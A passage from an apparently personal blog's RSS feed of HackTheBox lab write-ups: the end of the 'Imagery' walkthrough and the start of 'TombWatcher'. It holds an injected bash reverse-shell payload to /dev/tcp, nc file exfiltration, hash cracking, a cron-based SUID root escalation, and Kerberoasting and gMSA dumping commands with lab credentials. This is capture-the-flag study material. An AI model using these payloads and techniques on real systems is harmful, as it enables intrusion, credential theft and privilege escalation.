+        <span class="hljs-attr">"isAdmin"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"displayId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"e5f6g7h8"</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"login_attempts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"isTestuser"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"failed_login_attempts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
+        <span class="hljs-attr">"locked_until"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">null</span>
+    <span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">]</span></code></pre></div>
+<p>Putting them into crackstation gives us password for <code>testuser@imagery.htb</code>, <code>iambatman</code>.</p>
+<p><img src="/_resources/c7bdd1438b824a98b5bb8574681cf505.png" /></p>
+<p>That doesnt seem helpful, but we get to access this account which has new features enabled in the image menu.</p>
+<p><img src="/_resources/7b5817e82a634298ac644d1928322c93.png" /></p>
+<p><img src="/_resources/e1803a1f92b84f4290edd01ac33d8ae2.png" /></p>
+<p>We can intercept the request using burp and then modify one of the values to <code>";/bin/bash -c \" /bin/bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/4444 0&gt;&amp;1\";"</code> so we can establish a reverse shell.</p>
+<p><img src="/_resources/8a6dc51d6d4246b7b28637faec20e714.png" /></p>
+<div><pre class="hljs"><code>└─$ sudo nc -lvnp <span class="hljs-number">4444</span>
+<span class="hljs-symbol">sudo:</span> unable <span class="hljs-keyword">to</span> resolve host kali: Name <span class="hljs-built_in">or</span> service <span class="hljs-built_in">not</span> known
+listening <span class="hljs-keyword">on</span> [any] <span class="hljs-number">4444</span> ...
+connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span>.<span class="hljs-number">14.69</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span>.<span class="hljs-number">73.125</span>] <span class="hljs-number">53632</span>
+<span class="hljs-symbol">bash:</span> cannot <span class="hljs-keyword">set</span> terminal process <span class="hljs-keyword">group</span> (<span class="hljs-number">1400</span>): Inappropriate ioctl <span class="hljs-keyword">for</span> device
+<span class="hljs-symbol">bash:</span> no job control <span class="hljs-keyword">in</span> this shell
+web@Imagery:~/web$ </code></pre></div>
+<h1 id="priv-esc-user">Priv esc (user)</h1>
+<p>Running linpeas finds an interesting file.</p>
+<p><img src="/_resources/e392f16f6b7b4cb8b9f616b744d36d75.png" /></p>
+<p>We can send files over using nc.</p>
+<div><pre class="hljs"><code><span class="hljs-comment"># On victim</span>
+<span class="hljs-attribute">cd</span> /var/backup
+<span class="hljs-attribute">nc</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">15</span>.xx <span class="hljs-number">2137</span> &lt; web_20250806_120723.zip.aes
+
+<span class="hljs-comment"># On attack machine</span>
+<span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">2137</span> &gt; web.zip.aes</code></pre></div>
+<p>Do a checksum just in case.</p>
+<div><pre class="hljs"><code>sha<span class="hljs-number">256</span>sum web.zip.aes 
+<span class="hljs-number">4</span>b<span class="hljs-number">575e42816</span>be<span class="hljs-number">79083</span>a<span class="hljs-number">2</span>a<span class="hljs-number">19</span><span class="hljs-keyword">c</span><span class="hljs-number">48</span>a<span class="hljs-number">998</span><span class="hljs-keyword">cc</span><span class="hljs-number">3</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>d<span class="hljs-number">5</span>ab<span class="hljs-number">0</span>f<span class="hljs-number">3</span>a<span class="hljs-number">7</span>fbac<span class="hljs-number">2</span>a<span class="hljs-number">468</span>dd<span class="hljs-number">2087e6820</span>  web.zip.aes</code></pre></div>
+<p>runningn <a title="https://raw.githubusercontent.com/BridgerAlderson/pyAesDecrypt/refs/heads/main/pyAesDecrypt.py" href="https://raw.githubusercontent.com/BridgerAlderson/pyAesDecrypt/refs/heads/main/pyAesDecrypt.py">pyaesdecrypt</a> gets us the password.</p>
+<div><pre class="hljs"><code>[SUCCESS] Password found: bestfriends
+[SUCCESS] Decrypted <span class="hljs-keyword">file</span>: .<span class="hljs-regexp">/decrypted/</span>web_decrypted.zip</code></pre></div>
+<p>Checking db.json from the zip, we get a new user, mark.</p>
+<div><pre class="hljs"><code>        <span class="hljs-punctuation">{</span>
+            <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"mark@imagery.htb"</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"password"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"01c3d2e5bdaf6134cec0a367cf53e535"</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"displayId"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"868facaf"</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"isAdmin"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"failed_login_attempts"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"locked_until"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">null</span><span class="hljs-punctuation">,</span>
+            <span class="hljs-attr">"isTestuser"</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">false</span>
+        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span></code></pre></div>
+<p>Crackstation gets us pass, <code>supersmash</code>.</p>
+<p><img src="/_resources/6f3892c9978e47f396ab66eb73317923.png" /></p>
+<p>We cant ssh, but just <code>su mark</code> in our revshell and we finaly get user flag.</p>
+<p>Shell stabilisationfor Qol.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("bash")'</span>
+stty raw -<span class="hljs-built_in">echo</span> 
+^Z
+<span class="hljs-built_in">fg</span></code></pre></div>
+<h1 id="priv-esc-root">Priv esc (root)</h1>
+<p>Time to exploit sudo privs on charcol, whatever that is.</p>
+<div><pre class="hljs"><code>mark<span class="hljs-variable">@Imagery</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l
+Matching Defaults entries <span class="hljs-keyword">for</span> mark on <span class="hljs-symbol">Imagery:</span>
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>,
+    use_pty
+
+User mark may run the following commands on <span class="hljs-symbol">Imagery:</span>
+    (ALL) <span class="hljs-symbol">NOPASSWD:</span> /usr/local/bin/charcol</code></pre></div>
+<p>Looking online doesnt really help, as “charcol” returns images of charcoal, and “charcol linux” on 30/09/2025 already gives only writeups and this:</p>
+<p><img src="/_resources/9ba064ab13724560a31d93addfc5dcc7.png" /></p>
+<div><pre class="hljs"><code>mark<span class="hljs-variable">@Imagery</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>man charcol
+No manual entry <span class="hljs-keyword">for</span> charcol</code></pre></div>
+<p>Help suggests that we will have to somehow make a backup of <code>/etc/shadow</code> or just <code>/root</code> for flag.</p>
+<div><pre class="hljs"><code>sudo charcol <span class="hljs-keyword">help</span>
+usage: charcol.<span class="hljs-keyword">py</span> [--quiet] [-R] {<span class="hljs-keyword">shell</span>,<span class="hljs-keyword">help</span>} ...
+
+Charcol: A CLI tool <span class="hljs-keyword">to</span> create encrypted backup zip <span class="hljs-keyword">files</span>.
+
+positional arguments:
+  {<span class="hljs-keyword">shell</span>,<span class="hljs-keyword">help</span>}          Available commands
+    <span class="hljs-keyword">shell</span>               Enter <span class="hljs-keyword">an</span> interactive Charcol <span class="hljs-keyword">shell</span>.
+    <span class="hljs-keyword">help</span>                Show <span class="hljs-keyword">help</span> message <span class="hljs-keyword">for</span> Charcol <span class="hljs-built_in">or</span> <span class="hljs-keyword">a</span> specific <span class="hljs-keyword">command</span>.
+
+<span class="hljs-keyword">options</span>:
+  --quiet               Suppress <span class="hljs-keyword">all</span> informational output, showing <span class="hljs-keyword">only</span>
+                        warnings <span class="hljs-built_in">and</span> errors.
+  -R, --reset-password-<span class="hljs-keyword">to</span>-default
+                        Reset application password <span class="hljs-keyword">to</span> default (requires <span class="hljs-built_in">system</span>
+                        password verification).</code></pre></div>
+<p>Running <code>sudo charcol shell</code> asks for password 3 times and then gives a hint, that it can be reset using <code>reset password using charcol -R command</code> .</p>
+<div><pre class="hljs"><code>mark@Imagery:~$ sudo charcol -R
+
+Attempting <span class="hljs-keyword">to</span> reset Charcol application password <span class="hljs-keyword">to</span> default.
+[2025-09-30 12:28:02] [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> System </span>password verification required <span class="hljs-keyword">for</span> this operation.
+Enter<span class="hljs-built_in"> system </span>password <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-string">'mark'</span> <span class="hljs-keyword">to</span> confirm: 
+supersmash
+
+[2025-09-30 12:28:11] [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> System </span>password verified successfully.
+
+mark@Imagery:~$ sudo charcol shell
+
+First time setup: <span class="hljs-built_in">Set</span> your Charcol application password.
+Enter <span class="hljs-string">'1'</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">set</span> a new password, <span class="hljs-keyword">or</span> press Enter <span class="hljs-keyword">to</span> use <span class="hljs-string">'no password'</span> mode: 
+Are you sure you want <span class="hljs-keyword">to</span> use <span class="hljs-string">'no password'</span> mode? (<span class="hljs-literal">yes</span>/<span class="hljs-literal">no</span>): <span class="hljs-literal">yes</span>
+[2025-09-30 12:28:44] [<span class="hljs-built_in">INFO</span>]<span class="hljs-built_in"> Default </span>application password choice saved <span class="hljs-keyword">to</span> /root/.charcol/.charcol_config
+Using <span class="hljs-string">'no password'</span> mode. This choice has been remembered.
+Please restart the application <span class="hljs-keyword">for</span> changes <span class="hljs-keyword">to</span> take effect.
+mark@Imagery:~$ sudo charcol shell
+
+  ░██████  ░██                                                  ░██ 
+ ░██   ░░██ ░██                                                  ░██ 
+░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
+░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
+░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
+ ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
+  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
+                                                                    
+                                                                    
+                                                                    
+Charcol The Backup Suit - Development edition 1.0.0
+
+[2025-09-30 12:28:51] [<span class="hljs-built_in">INFO</span>] Entering Charcol interactive shell.<span class="hljs-built_in"> Type </span><span class="hljs-string">'help'</span> <span class="hljs-keyword">for</span> commands, <span class="hljs-string">'exit'</span> <span class="hljs-keyword">to</span> quit.
+charcol&gt; </code></pre></div>
+<p>We finaly get to use this tool. Running <code>backup -i /root</code> automaticly sets user to <code>root:root</code> and perms 644, so that wont work. Help tells us that charcol can run cronjobs.</p>
+<div><pre class="hljs"><code>- Status 2 <span class="hljs-params">(no app password)</span>, cron, unencrypted backup:
+  CHARCOL_NON_INTERACTIVE=<span class="hljs-literal">true</span> charcol auto add \
+  <span class="hljs-params">--schedule</span> <span class="hljs-string">"0 2 * * *"</span> <span class="hljs-params">--command</span> <span class="hljs-string">"charcol backup -i /home/user/docs"</span> \
+  <span class="hljs-params">--name</span> <span class="hljs-string">"Daily Docs Backup"</span> <span class="hljs-params">--log-output</span> &lt;log_file_path&gt;</code></pre></div>
+<p>That means that we can do basicly whatever we want, get a shell or just copy the flag.</p>
+<div><pre class="hljs"><code>auto add --schedule <span class="hljs-string">"* * * * *"</span> --command <span class="hljs-string">"chmod +s /usr/bin/bash"</span> --name <span class="hljs-string">"pwned"</span> 
+<span class="hljs-keyword">exit</span></code></pre></div>
+<p>Then just run using suid and that’s it. <code>/bin/bash -p</code>.</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Windows - Medium - TombWatcher]]></title>
+            <guid>3d7cba679549464eaf0116adf04a4786</guid>
+            <pubDate>Tue, 12 Aug 2025 09:39:10 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p>Nmap finds domain tombwatcher.htb</p>
+<div><pre class="hljs"><code><span class="hljs-string">└──╼</span> [<span class="hljs-string">★</span>]<span class="hljs-string">$</span> <span class="hljs-string">nmap</span> <span class="hljs-string">-p-</span> <span class="hljs-string">-A</span> <span class="hljs-number">10.129</span><span class="hljs-number">.232</span><span class="hljs-number">.167</span>
+<span class="hljs-string">PORT</span>      <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>       <span class="hljs-string">VERSION</span>
+<span class="hljs-number">53</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">domain</span>        <span class="hljs-string">Simple</span> <span class="hljs-string">DNS</span> <span class="hljs-string">Plus</span>
+<span class="hljs-number">80</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">http</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">IIS</span> <span class="hljs-string">httpd</span> <span class="hljs-number">10.0</span>
+<span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-IIS/10.0</span>
+<span class="hljs-string">|_http-title:</span> <span class="hljs-string">IIS</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Server</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">http-methods:</span> 
+<span class="hljs-string">|_</span>  <span class="hljs-attr">Potentially risky methods:</span> <span class="hljs-string">TRACE</span>
+<span class="hljs-number">88</span><span class="hljs-string">/tcp</span>    <span class="hljs-string">open</span>  <span class="hljs-string">kerberos-sec</span>  <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Kerberos</span> <span class="hljs-string">(server</span> <span class="hljs-attr">time:</span> <span class="hljs-number">2025-08-12 13:37:36Z</span><span class="hljs-string">)</span>
+<span class="hljs-number">135</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">139</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">netbios-ssn</span>   <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">netbios-ssn</span>
+<span class="hljs-number">389</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">tombwatcher.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-number">2025-08-12T13:39:12+00:00</span><span class="hljs-string">;</span> <span class="hljs-string">+4h00m00s</span> <span class="hljs-string">from</span> <span class="hljs-string">scanner</span> <span class="hljs-string">time.</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-11-16T00:47:59</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-11-16T00:47:59</span>
+<span class="hljs-number">445</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">microsoft-ds?</span>
+<span class="hljs-number">464</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">kpasswd5?</span>
+<span class="hljs-number">593</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>    <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span>
+<span class="hljs-number">636</span><span class="hljs-string">/tcp</span>   <span class="hljs-string">open</span>  <span class="hljs-string">ssl/ldap</span>      <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">tombwatcher.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-number">2025-08-12T13:39:11+00:00</span><span class="hljs-string">;</span> <span class="hljs-string">+4h00m01s</span> <span class="hljs-string">from</span> <span class="hljs-string">scanner</span> <span class="hljs-string">time.</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-11-16T00:47:59</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-11-16T00:47:59</span>
+<span class="hljs-number">3268</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ldap</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">tombwatcher.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-number">2025-08-12T13:39:12+00:00</span><span class="hljs-string">;</span> <span class="hljs-string">+4h00m00s</span> <span class="hljs-string">from</span> <span class="hljs-string">scanner</span> <span class="hljs-string">time.</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-11-16T00:47:59</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-11-16T00:47:59</span>
+<span class="hljs-number">3269</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">ssl/ldap</span>      <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Active</span> <span class="hljs-string">Directory</span> <span class="hljs-string">LDAP</span> <span class="hljs-string">(Domain:</span> <span class="hljs-string">tombwatcher.htb0.,</span> <span class="hljs-attr">Site:</span> <span class="hljs-string">Default-First-Site-Name)</span>
+<span class="hljs-string">|_ssl-date:</span> <span class="hljs-number">2025-08-12T13:39:11+00:00</span><span class="hljs-string">;</span> <span class="hljs-string">+4h00m01s</span> <span class="hljs-string">from</span> <span class="hljs-string">scanner</span> <span class="hljs-string">time.</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ssl-cert: Subject:</span> <span class="hljs-string">commonName=DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Subject Alternative Name: othername:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span><span class="hljs-string">::&lt;unsupported&gt;,</span> <span class="hljs-string">DNS:DC01.tombwatcher.htb</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">Not valid before:</span> <span class="hljs-number">2024-11-16T00:47:59</span>
+<span class="hljs-string">|_Not</span> <span class="hljs-attr">valid after:</span>  <span class="hljs-number">2025-11-16T00:47:59</span>
+<span class="hljs-number">5985</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">http</span>          <span class="hljs-string">Microsoft</span> <span class="hljs-string">HTTPAPI</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.0</span> <span class="hljs-string">(SSDP/UPnP)</span>
+<span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Microsoft-HTTPAPI/2.0</span>
+<span class="hljs-string">|_http-title:</span> <span class="hljs-string">Not</span> <span class="hljs-string">Found</span>
+<span class="hljs-number">9389</span><span class="hljs-string">/tcp</span>  <span class="hljs-string">open</span>  <span class="hljs-string">mc-nmf</span>        <span class="hljs-string">.NET</span> <span class="hljs-string">Message</span> <span class="hljs-string">Framing</span>
+<span class="hljs-number">49667</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49669</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ncacn_http</span>    <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span> <span class="hljs-string">over</span> <span class="hljs-string">HTTP</span> <span class="hljs-number">1.0</span>
+<span class="hljs-number">49670</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49674</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49692</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49707</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span>
+<span class="hljs-number">49722</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">msrpc</span>         <span class="hljs-string">Microsoft</span> <span class="hljs-string">Windows</span> <span class="hljs-string">RPC</span></code></pre></div>
+<p>We can locate high value targets as henry.</p>
+<p><code>bloodhound-python -u 'john' -p 'Password1'  -d tombwatcher.htb -ns 10.129.232.167 -c All --zip</code></p>
+<p><img src="/_resources/66c3823f23784a7082f2055452b2fa5e.png" /></p>
+<p>We can set the time and then get the hash for alfred.</p>
+<div><pre class="hljs"><code>┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-4k1brha7vc]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ sudo ntpdate <span class="hljs-number">10.129</span>.<span class="hljs-number">232.167</span>
+<span class="hljs-number">2025</span>-<span class="hljs-number">08</span>-<span class="hljs-number">12</span> <span class="hljs-number">08</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39.47608</span> (-<span class="hljs-number">0500</span>) +<span class="hljs-number">14400.343076</span> +/- <span class="hljs-number">0.039869</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">232.167</span> s1 no-leap
+CLOCK: <span class="hljs-selector-tag">time</span> stepped by <span class="hljs-number">14400.343076</span>
+┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-4k1brha7vc]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ python3 targetedKerberoast<span class="hljs-selector-class">.py</span> -v -d <span class="hljs-string">'tombwatcher.htb'</span> -u <span class="hljs-string">'henry'</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'H3nry_987TGV!'</span> 
+<span class="hljs-selector-attr">[*]</span> Starting kerberoast attacks
+<span class="hljs-selector-attr">[*]</span> Fetching usernames from Active Directory with LDAP
+<span class="hljs-selector-attr">[VERBOSE]</span> SPN added successfully <span class="hljs-keyword">for</span> (Alfred)
+<span class="hljs-selector-attr">[+]</span> Printing hash <span class="hljs-keyword">for</span> (Alfred)
+<span class="hljs-variable">$krb5tgs</span>$<span class="hljs-number">23</span>$*Alfred<span class="hljs-variable">$TOMBWATCHER</span>.HTB<span class="hljs-variable">$tombwatcher</span>.htb/Alfred*<span class="hljs-variable">$d5679e52a</span>&lt;snip&gt;<span class="hljs-number">4</span>d84c73d9097a844933a388857bb3b4a08d379262d954f76be21157b669b4018f53b76f04d7633580a4
+<span class="hljs-selector-attr">[VERBOSE]</span> SPN removed successfully <span class="hljs-keyword">for</span> (Alfred)</code></pre></div>
+<p>We can then crack the hash with john.</p>
+<div><pre class="hljs"><code>└──╼ [★]$ sudo john ./hash_alfred 
+<span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span>
+Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (krb5tgs, Kerberos <span class="hljs-number">5</span> TGS etype <span class="hljs-number">23</span> [MD4 HMAC-MD5 RC4])
+Will run <span class="hljs-number">4</span> OpenMP threads
+Proceeding <span class="hljs-keyword">with</span> single, rules:Single
+Press Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, <span class="hljs-keyword">or</span> send SIGUSR1 <span class="hljs-keyword">to</span> john process <span class="hljs-keyword">for</span> status
+Almost done: Processing the remaining buffered candidate passwords, <span class="hljs-keyword">if</span> <span class="hljs-keyword">any</span>.
+Proceeding <span class="hljs-keyword">with</span> wordlist:/usr/<span class="hljs-keyword">share</span>/john/<span class="hljs-keyword">password</span>.lst
+basketball       (?)     
+<span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE <span class="hljs-number">2</span>/<span class="hljs-number">3</span> (<span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-12</span> <span class="hljs-number">08</span>:<span class="hljs-number">54</span>) <span class="hljs-number">50.00</span>g/s <span class="hljs-number">51200</span>p/s <span class="hljs-number">51200</span>c/s <span class="hljs-number">51200</span>C/s <span class="hljs-number">123456.</span>.random
+Use the "--show" <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably
+<span class="hljs-keyword">Session</span> completed. </code></pre></div>
+<p>We can add ourselves to the infra group.</p>
+<p><img src="/_resources/69b71702babb49698e887b9c20416107.png" /></p>
+<p>┌─[eu-dedivip-1]─[10.10.14.49]─[abno525@htb-4k1brha7vc]─[~/my_data]<br />
+└──╼ [★]$ bloodyAD --host ‘10.129.232.167’ -d ‘tombwatcher.htb’ -u alfred -p ‘basketball’ add groupMember INFRASTRUCTURE alfred<br />
+[+] alfred added to INFRASTRUCTURE</p>
+<p>Then we takeover ansible_dev.</p>
+<p><img src="/_resources/6fd7b75e2de7467bbf2ad3fdd43a9f04.png" /></p>
+<div><pre class="hljs"><code>└──╼ [★]<span class="hljs-variable">$ </span>python3 gMSADumper.py -u <span class="hljs-string">'alfred'</span> -p <span class="hljs-string">'basketball'</span> -d <span class="hljs-string">'tombwatcher.htb'</span>
+Users <span class="hljs-keyword">or</span> groups who can read password <span class="hljs-keyword">for</span> ansible_dev<span class="hljs-variable">$:</span>
+ &gt; Infrastructure
+ansible_dev<span class="hljs-variable">$:</span>::<span class="hljs-number">7</span>bc5a56af89da4d3c03bc048055350f2
